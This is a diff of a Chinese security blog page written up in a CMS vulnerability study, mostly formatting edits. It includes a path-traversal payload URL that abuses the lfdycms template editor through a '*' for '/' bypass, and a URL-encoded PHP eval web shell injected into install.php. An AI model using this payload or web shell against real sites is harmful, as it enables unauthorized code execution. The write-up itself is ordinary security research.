@@ -29,8 +29,8 @@
 
     <script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="EASY" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><link rel="alternate" href="/atom.xml" title="EASY" type="application/atom+xml">
+</head>
 
 
 <body>
@@ -457,9 +457,9 @@
 <p>显示为NULL存在注入。</p>
 <h2 id="后台任意文件修改"><a href="#后台任意文件修改" class="headerlink" title="后台任意文件修改"></a>后台任意文件修改</h2><p>漏洞位置后台模板修改处，代码位置：<code>TemplateController.class.php</code> 文件的edit方法处。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/EASY233/picture/20200803155637.png" alt=""></p>
-<p>可以看到路径参数path只是简单的把<em>替换成/的简单防御。我们可以使用</em>替换/即可绕过</p>
+<p>可以看到路径参数path只是简单的把*替换成/的简单防御。我们可以使用*替换/即可绕过</p>
 <p>编辑install.php文件：</p>
-<p>payload:[<code>http://lfdycms.study/admin.php?s=/Template/edit/path/*](http://lfdycms.study/admin.php?s=/Template/edit/path/*)..*install.php</code></p>
+<p>payload:<code>http://lfdycms.study/admin.php?s=/Template/edit/path/*..*install.php</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/EASY233/picture/20200803155658.png" alt=""></p>
 <p>但是在测试过程中发现在浏览器无论怎么修改发出去的包都是原来的文件内容(bug??),通过burp抓包，在content内容最后面添加代码：<code>%0D%0Aeval(%24_POST%5b%27EASY%27%5d)%3b</code> ，修改文件路径，发包发现成功修改。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/EASY233/picture/20200803155720.png" alt=""></p>
